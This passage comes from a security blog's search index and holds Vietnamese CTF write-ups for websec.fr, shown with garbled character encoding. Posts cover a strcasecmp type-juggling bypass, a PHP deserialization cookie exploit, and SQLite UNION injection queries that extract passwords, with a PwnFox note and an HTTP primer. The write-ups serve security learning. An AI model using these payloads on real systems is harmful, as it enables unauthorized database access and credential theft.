strcasecmp($str1, $str2) s·∫Ω nh·∫≠n v√†o 2 string ƒë·ªÉ so s√°nh. K·∫øt qu·∫£ tr·∫£ v·ªÅ l√†: &gt; 0: N·∫øu nh∆∞ $str1 &gt; $str2. &lt; 0: N·∫øu nh∆∞ $str1 &lt; $str2. &#x3D; 0: N·∫øu nh∆∞ $str1 &#x3D; $str2. D·∫•u ch·∫•m thang ·ªü ph√≠a tr∆∞·ªõc c√≥ nghƒ©a l√† $str1 v√† $str2 b·∫±ng nhau. 12if (! strcasecmp ($_POST[&#x27;flag&#x27;], $flag))if (strcasecpm($_POST[&#x27;flag&#x27;], $flag) == 0) Hai d√≤ng code tr√™n l√† t∆∞∆°ng t·ª± nhau v·ªÅ m·∫∑t ch·ª©c nƒÉng v√† b·∫£n ch·∫•t. Khi so s√°nh == th√¨ l·∫°i ƒë·ªÉ √Ω t·ªõi l·ªói Type Jugling v√† tham kh·∫£o hai h√¨nh b√™n d∆∞·ªõi. &#96; ExploitKhi m√† so s√°nh trong h√†m strcasecpm() s·∫Ω cho ra k·∫øt qu·∫£ l√† False. Ti·∫øp theo False so v·ªõi 0 th√¨ s·∫Ω l√† True. T·ª´ ƒë√≥, s·∫Ω t√¨m ra ƒë∆∞·ª£c flag. Payload: flag[]&#x3D;1 K·∫øt qu·∫£: Referenceshttps://techgeekgalaxy.com/php-equality-comparisons/#:~:text=or%20security%20exploits.-,Strict%20Comparison%20(%3D%3D%3D),types%20then%20false%20is%20returned. https://danuxx.blogspot.com/2013/03/unauthorized-access-bypassing-php-strcmp.html","categories":[{"name":"CTF","slug":"CTF","permalink":"https://dovankha.github.io/categories/CTF/"},{"name":"Websec","slug":"CTF/Websec","permalink":"https://dovankha.github.io/categories/CTF/Websec/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://dovankha.github.io/tags/ctf/"},{"name":"babysteps","slug":"babysteps","permalink":"https://dovankha.github.io/tags/babysteps/"},{"name":"TypeJugling","slug":"TypeJugling","permalink":"https://dovankha.github.io/tags/TypeJugling/"}]},{"title":"PwnFox Extension on Firefox for Pentester","slug":"PwnFox","date":"2022-07-20T09:51:32.000Z","updated":"2022-07-25T04:21:41.300Z","comments":true,"path":"2022/07/20/PwnFox/","link":"","permalink":"https://dovankha.github.io/2022/07/20/PwnFox/","excerpt":"","text":"Trong b√†i vi·∫øt n√†y, m√¨nh s·∫Ω gi·ªõi thi·ªáu m·ªçi ng∆∞·ªùi m·ªôt extension chuy√™n d√πng cho vi·ªác c√†i ƒë·∫∑t proxy cho Burp Suite, ngo√†i ra n√≥ c√≤n c√≥ nhi·ªÅu t√≠nh nƒÉng hay ho n·ªØa üòç. Link extension: https://github.com/yeswehack/PwnFox InstallC√°c b·∫°n v√†o link github ·ªü tr√™n, download file pwnfox.jar v·ªÅ m√°y v√† l∆∞u n√≥ ·ªü th∆∞ m·ª•c n√†o m√† b·∫°n mu·ªën. Sau khi t·∫£i extension xong, m·ªü ·ª©ng d·ª•ng Burp Suite l√™n, v√†o tab Extension. Ch·ªçn Add, c·ª≠a s·ªï Load Burp Extension hi·ªán l√™n, ch·ªçn ƒë·∫øn file pwnfox.jar v·ª´a t·∫£i l√∫c n√£y, sau ƒë√≥ b·∫•m Next l√† xong. Set upM·ªü tr√¨nh duy·ªát FireFox, t√¨m ki·∫øm pwnfox entension. Sau khi c√†i extension cho Firefox, setting c·ªßa Pwnfox ki·ªÉm tra IP v√† PORT ƒë√£ ƒë√∫ng ch∆∞a. B∆∞·ªõc cu·ªëi c√πng l√† v√†o ph·∫ßn Setting Network c·ªßa Firefox ƒë·ªÉ l·ª±a ch·ªçn No proxy. T√≠nh nƒÉng container tabN√≥ s·∫Ω l√† nh·ªØng tab c√≥ m√†u s·∫Øc tr√™n firefox. M·ªói tab s·∫Ω ho·∫°t ƒë·ªông ƒë·ªôc l·∫≠p v·ªõi c√°c session kh√°c nhau. Khi ƒëi qua proxy Burp Suite, v√†o history s·∫Ω th·∫•y ƒë∆∞·ª£c m√†u c·ªßa c√°c tab t∆∞∆°ng ·ª©ng.","categories":[{"name":"Technical","slug":"Technical","permalink":"https://dovankha.github.io/categories/Technical/"}],"tags":[{"name":"extension","slug":"extension","permalink":"https://dovankha.github.io/tags/extension/"},{"name":"pwnfox","slug":"pwnfox","permalink":"https://dovankha.github.io/tags/pwnfox/"}]},{"title":"[WebSec] Level 4","slug":"lv4","date":"2022-07-19T14:05:12.000Z","updated":"2022-08-16T14:58:59.921Z","comments":true,"path":"2022/07/19/lv4/","link":"","permalink":"https://dovankha.github.io/2022/07/19/lv4/","excerpt":"","text":"https://websec.fr/level04/index.php Information GatheringChallenge n√†y c√≥ ch·ªó input l√† id, nh∆∞ng kh√¥ng gi·ªëng nh∆∞ Level 1 l√† s·∫Ω ra l·ªói khi nh·∫≠p k√Ω t·ª± ƒë·∫∑c bi·ªát. V·ªõi gi√° tr·ªã cookie leet_hax0r: Decode base64 ra th√¨ l√† m·ªôt d·∫°ng json sau khi serialize. 1a:1:&#123;s:2:&quot;ip&quot;;s:13:&quot;116.96.78.101&quot;;&#125; √ù nghƒ©a c·ªßa c√°c th√†nh ph·∫ßn ƒëo·∫°n JSON tr√™n l√†: a: array s·∫Ω ch·ª©a 1 gi√° tr·ªã duy nh·∫•t l√† ip.ip c√≥ ƒë·ªô d√†i l√† 2, v√† c√≥ value d√†i 13 k√≠ t·ª±. C·∫•u tr√∫c c·ªßa Serialize trong PHP c√≥ d·∫°ng data-type:data. 1234567891011121314151617BOOLEANb:value (value ch·ªâ c√≥ gi√° tr·ªã 1 ho·∫∑c 0. 1 l√† ƒë√∫ng, 0 l√† sai).STRINGs:size:value (s:5:&quot;12345&quot;)INTEGERi:valueNULLN;ARRAYa:size:&#123;key:value; (l·∫∑p l·∫°i key:value ƒë·∫øn khi b·∫±ng size))&#125;OBJECTO:length_object_name:object_name:object_size:&#123;&lt;property&gt;:&lt;value&gt;&#125; Challenge cho 2 source code, nh∆∞ng ch√∫ √Ω trong source 1 l√† vi·∫øt ·ªü d·∫°ng OOP, c√≥ c√°c Magic Methods ƒë∆∞·ª£c d√πng nh∆∞ __construct(), __destruct(). __construct(): h√†m n√†y ƒë∆∞·ª£c g·ªçi khi kh·ªüi t·∫°o m·ªôt ƒë·ªëi t∆∞·ª£ng. __destruct(): h√†m n√†y ƒë∆∞·ª£c g·ªçi khi ƒë·ªëi t∆∞·ª£ng b·ªã xo√° ƒëi. Khi n√≥ kh√¥ng tham chi·∫øu ƒë·∫øn ƒë·ªëi t∆∞·ª£ng deserialize t·ªìn t·∫°i. Qu√° tr√¨nh serialize v√† deserialize di·ªÖn ra nh∆∞ h√¨nh b√™n d∆∞·ªõi: Exploitƒê·ªÉ √Ω d√≤ng code ·ªü source 2. Th√¨ gi√° tr·ªã cookie leet_hax0r ƒë∆∞·ª£c encode base64. M√¨nh s·∫Ω t·∫°o d√≤ng Code gi·ªëng class SQL ƒë·ªÉ serialize n√≥. 12345678&lt;?phpclass SQL&#123; public $query=&#x27;select username from users where id = -1 union select sql from sqlite_master&#x27;;&#125;$a = new SQL();echo serialize($a), PHP_EOL;echo base64_encode(serialize($a)); Sau khi bulid source xong, run code s·∫Ω ra Object v√† ƒëo·∫°n base64 nh∆∞ sau: V√¨ sao ph·∫£i d√πng UNION ƒë·ªÉ select sql m√† kh√¥ng select ·ªü v·∫ø tr∆∞·ªõc lu√¥n? V√¨ ta ƒë·ªÉ √Ω source code 2, trong h√†m __destruct() ch·ªâ in ra m√†n h√¨nh $row[&#39;username&#39;]. N√™n b·∫Øt bu·ªôc trong c√¢u query c·ªßa m√¨nh ph·∫£i select username. Ho·∫∑c c√≥ th·ªÉ d√πng c√¢u query g√°n t√™n c·ªôt c·∫ßn select b·∫±ng username nh∆∞ sau cho g·ªçn: select group_concat(sql) as username from ... Copy ƒëo·∫°n base64 thay th·∫ø gi√° tr·ªã cookie leet_hax0r, sau ƒë√≥ g·ª≠i reuqest: Ki·ªÉm tra xem c√≤n table n√†o ngo√†i users kh√¥ng? K·∫øt qu·∫£ l√† kh√¥ng c√≤n table n√†o kh√°c. M√¨nh ƒëo√°n l√† Flag n·∫±m ·ªü password, n√™n s·∫Ω select password ra.","categories":[{"name":"CTF","slug":"CTF","permalink":"https://dovankha.github.io/categories/CTF/"},{"name":"Websec","slug":"CTF/Websec","permalink":"https://dovankha.github.io/categories/CTF/Websec/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://dovankha.github.io/tags/ctf/"},{"name":"babysteps","slug":"babysteps","permalink":"https://dovankha.github.io/tags/babysteps/"},{"name":"unserialize","slug":"unserialize","permalink":"https://dovankha.github.io/tags/unserialize/"}]},{"title":"[WebSec] Level 1","slug":"lv1","date":"2022-07-19T13:45:45.000Z","updated":"2022-08-16T14:58:30.505Z","comments":true,"path":"2022/07/19/lv1/","link":"","permalink":"https://dovankha.github.io/2022/07/19/lv1/","excerpt":"","text":"https://websec.fr/level01/index.php Information GatheringSau khi nh√¨n s∆° qua b·ªëi c·∫£nh challenge, th√¨ c√≥ 1 ch·ªó input l√† s·ªë ƒë·ªÉ xem th√¥ng tin ID.V√† challenge c≈©ng ƒë√£ cho source s·∫µn: 123456789101112131415class LevelOne &#123; public function doQuery($injection) &#123; $pdo = new SQLite3(&#x27;database.db&#x27;, SQLITE3_OPEN_READONLY); $query = &#x27;SELECT id,username FROM users WHERE id=&#x27; . $injection . &#x27; LIMIT 1&#x27;; $getUsers = $pdo-&gt;query($query); $users = $getUsers-&gt;fetchArray(SQLITE3_ASSOC); if ($users) &#123; return $users; &#125; return false; &#125;&#125; V·ªõi ƒëo·∫°n code tr√™n, t·∫°i d√≤ng 5. N·∫øu nh∆∞ m√¨nh truy·ªÅn v√†o l√† d·∫•u ‚Äò, ch·ªØ c√°i, k√≠ t·ª± ƒë·∫∑c bi·ªát th√¨ s·∫Ω b√°o l·ªói. V·ªõi source code v√† th√¥ng b√°o l·ªói, m√¨nh x√°c ƒë·ªãnh ƒë∆∞·ª£c ƒë√¢y l√† l·ªói SQL injection tr√™n SQLite3. ExploitV√¨ ID ki·ªÉu d·ªØ li·ªáu th∆∞·ªùng l√† s·ªë, n√™n m√¨nh s·∫Ω d√πng k·ªπ thu·∫≠t khai th√°c l√† UNION. Ki·ªÉm tra s·ªë c·ªôt ƒë∆∞·ª£c select. 121 order by 2 ==&gt; OK1 order by 3 ==&gt; ERROR V·∫≠y l√† c√≥ 2 c·ªôt ƒë∆∞·ª£c select. Ti·∫øp theo c·∫ßn xem c√°c c·ªôt ƒë√≥ l√† g√¨. 121 and 1=2 union select sql,2 from sqlite_master// CREATE TABLE users(id int(7), username varchar(255), password varchar(255)) X√°c ƒë·ªãnh ƒë∆∞·ª£c table l√† users v√† c√°c c·ªôt l√† id, username, password. T√¨m xem c√≤n table n√†o ngo√†i users hay kh√¥ng? 11 and 1=2 union select group_concat(tbl_name),2 from sqlite_master where type=&#x27;table&#x27; and tbl_name NOT like &#x27;sqlite_%&#x27; Cu·ªëi c√πng get flag th√¥i. 11 and 1=2 union select password from users where username=&quot;flag&quot;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://dovankha.github.io/categories/CTF/"},{"name":"Websec","slug":"CTF/Websec","permalink":"https://dovankha.github.io/categories/CTF/Websec/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://dovankha.github.io/tags/ctf/"},{"name":"babysteps","slug":"babysteps","permalink":"https://dovankha.github.io/tags/babysteps/"},{"name":"sqli","slug":"sqli","permalink":"https://dovankha.github.io/tags/sqli/"}]},{"title":"HTTP‚ÅÑHTTPS","slug":"HTTP‚ÅÑHTTPS","date":"2022-07-19T02:08:46.115Z","updated":"2022-07-21T00:12:20.110Z","comments":true,"path":"2022/07/19/HTTP‚ÅÑHTTPS/","link":"","permalink":"https://dovankha.github.io/2022/07/19/HTTP%E2%81%84HTTPS/","excerpt":"","text":"HTTP&#x2F;HTTPSCreated: June 20, 2021 8:30 AMStatus: Complete HTTPHypertext Transfer Protocol (giao th·ª©c truy·ªÅn t·∫£i si√™u vƒÉn b·∫£n). D√πng port: 80 Giao th·ª©c c∆° b·∫£n d√πng cho World Wide Web (www) ƒë·ªÉ truy·ªÅn d·ªØ li·ªáu d∆∞·ªõi d·∫°ng vƒÉn b·∫£n, h√¨nh ·∫£nh, √¢m thanh t·ª´ webserver ƒë·∫øn c√°c tr√¨nh duy·ªát v√† ng∆∞·ª£c l·∫°i. HTTPSHypertext Transfer Protocol Secure. D√πng port: 443&#x2F;4433 D·ªØ li·ªáu chuy·ªÉn t·ª´ Webserver ƒë·∫øn tr√¨nh duy·ªát kh√¥ng ƒë∆∞·ª£c m√£ h√≥a, d·ªÖ b·ªã ƒë√°nh c·∫Øp. Giao th·ª©c https d√πng SSL (secure sockets layer - l·ªõp c·ªïng b·∫£o m·∫≠t) ƒë·ªÉ m√£ h√≥a d·ªØ li·ªáu gi·ªØa website v√† web browser. Hi·ªán t·∫°i SSL kh√¥ng c√≤n ƒë∆∞·ª£c s·ª≠ d·ª•ng n·ªØa, chuy·ªÉn sang TSL (Transport Security Layer), gi·ªëng nh∆∞ SSL. HTTP Status Code 100-199: Information (100: Continue; 101: Switching protocols). 200-299: Successes (200 OK is the ‚Äúnormal‚Äù response for a GET; 201: Created; 201: Accepted; 203: Non-authoritative information; 204: No content; 205: Reset content; 206: Partial content) 300-399: Redirects (the information you want is elsewhere‚Äô 301: Moved permanently; 302: Moved temporarily; 304: Not modified) 400-499: Client errors (You did something wrong, like asking for something that doesn‚Äôt exist; 403: forbidden; 404: not found; 405: Method not allowed; ‚Ä¶) 500-599: Server errors (The server tried, but something went wrong on their side; 500: internal server error; 501: Not implemented; 502: Bad gateway; 505: Gateway timeout) Vi du 201 Created ‚Äì Tr·∫£ v·ªÅ khi m·ªôt Resouce v·ª´a ƒë∆∞·ª£c t·∫°o th√†nh c√¥ng. 204 No Content ‚Äì Tr·∫£ v·ªÅ khi Resource xo√° th√†nh c√¥ng. 304 Not Modified ‚Äì Client c√≥ th·ªÉ s·ª≠ d·ª•ng d·ªØ li·ªáu cache. 400 Bad Request ‚Äì Request kh√¥ng h·ª£p l·ªá 401 Unauthorized ‚Äì Request c·∫ßn c√≥ auth. 403 Forbidden ‚Äì b·ªã t·ª´ ch·ªëi kh√¥ng cho ph√©p. 404 Not Found ‚Äì Kh√¥ng t√¨m th·∫•y resource t·ª´ URI 405 Method Not Allowed ‚Äì Ph∆∞∆°ng th·ª©c kh√¥ng cho ph√©p v·ªõi user hi·ªán t·∫°i. 410 Gone ‚Äì Resource kh√¥ng c√≤n t·ªìn t·∫°i, Version c≈© ƒë√£ kh√¥ng c√≤n h·ªó tr·ª£. 415 Unsupported Media Type ‚Äì Kh√¥ng h·ªó tr·ª£ ki·ªÉu Resource n√†y. 422 Unprocessable Entity ‚Äì D·ªØ li·ªáu kh√¥ng ƒë∆∞·ª£c x√°c th·ª±c 429 Too Many Requests ‚Äì Request b·ªã t·ª´ ch·ªëi do b·ªã gi·ªõi h·∫°n HTTP Request methods (HTTP Verb Tampering) GET: l·∫•y th√¥ng tin t·ª´ server ƒë√£ cung c·∫•p t·ª´ url. (C√°c y√™u c·∫ßu GET ko ·∫£nh h∆∞·ªõng ƒë·∫øn d·ªØ li·ªáu). HEAD: t∆∞∆°ng t·ª± GET, nh∆∞ng c√≥ th√™m tr·∫°ng th√°i v√† khu v·ª±c Header. POST: y√™u c·∫ßu g·ª≠i d·ªØ li·ªáu ƒë·∫øn server. (vd: th√¥ng tin kh√°ch h√†ng, file t·∫£i l√™n, ..), s·ª≠ d·ª•ng c√°c th·∫ª HTML. PUT: thay ƒë·ªïi t·∫•t c·∫£ c√°c ƒë·∫°i di·ªán c·ªßa ngu·ªìn v·ªõi n·ªôi dung ƒë∆∞·ª£c t·∫£i l√™n. DELETE: g·ª° b·ªè t·∫•t c·∫£ c√°c ƒë·∫°i di·ªán c·ªßa ngu·ªìn b·ªüi URL. CONNECT: thi·∫øt l·∫≠p m·ªôt tunnel t·ªõi server ƒë∆∞·ª£c x√°c ƒë·ªãnh b·ªüi URl ƒë√£ c·∫•p. OPTIONS: mi√™u t·∫£ ch·ª©c nƒÉng giao ti·∫øp cho ngu·ªìn m·ª•c ti√™u. TRACE: tr√¨nh b√†y v√≤ng l·∫∑p ki·ªÉm tra th√¥ng b√°o song song v·ªõi path t·ªõi resource.","categories":[{"name":"Security","slug":"Security","permalink":"https://dovankha.github.io/categories/Security/"},{"name":"Web","slug":"Security/Web","permalink":"https://dovankha.github.io/categories/Security/Web/"}],"tags":[{"name":"http","slug":"http","permalink":"https://dovankha.github.io/tags/http/"}]}],"categories":[{"name":"CTF","slug":"CTF","permalink":"https://dovankha.github.io/categories/CTF/"},{"name":"Websec","slug":"CTF/Websec","permalink":"https://dovankha.github.io/categories/CTF/Websec/"},{"name":"Technical","slug":"Technical","permalink":"https://dovankha.github.io/categories/Technical/"},{"name":"Security","slug":"Security","permalink":"https://dovankha.github.io/categories/Security/"},{"name":"Web","slug":"Security/Web","permalink":"https://dovankha.github.io/categories/Security/Web/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://dovankha.github.io/tags/ctf/"},{"name":"PathTraversal","slug":"PathTraversal","permalink":"https://dovankha.github.io/tags/PathTraversal/"},{"name":"easy","slug":"easy","permalink":"https://dovankha.github.io/tags/easy/"},{"name":"TypeJugling","slug":"TypeJugling","permalink":"https://dovankha.github.io/tags/TypeJugling/"},{"name":"uploadFile","slug":"uploadFile","permalink":"https://dovankha.github.io/tags/uploadFile/"},{"name":"sqli","slug":"sqli","permalink":"https://dovankha.github.io/tags/sqli/"},{"name":"babysteps","slug":"babysteps","permalink":"https://dovankha.github.io/tags/babysteps/"},{"name":"parameter","slug":"parameter","permalink":"https://dovankha.github.io/tags/parameter/"},{"name":"extension","slug":"extension","permalink":"https://dovankha.github.io/tags/extension/"},{"name":"pwnfox","slug":"pwnfox","permalink":"https://dovankha.github.io/tags/pwnfox/"},{"name":"unserialize","slug":"unserialize","permalink":"https://dovankha.github.io/tags/unserialize/"},{"name":"http","slug":"http","permalink":"https://dovankha.github.io/tags/http/"}]}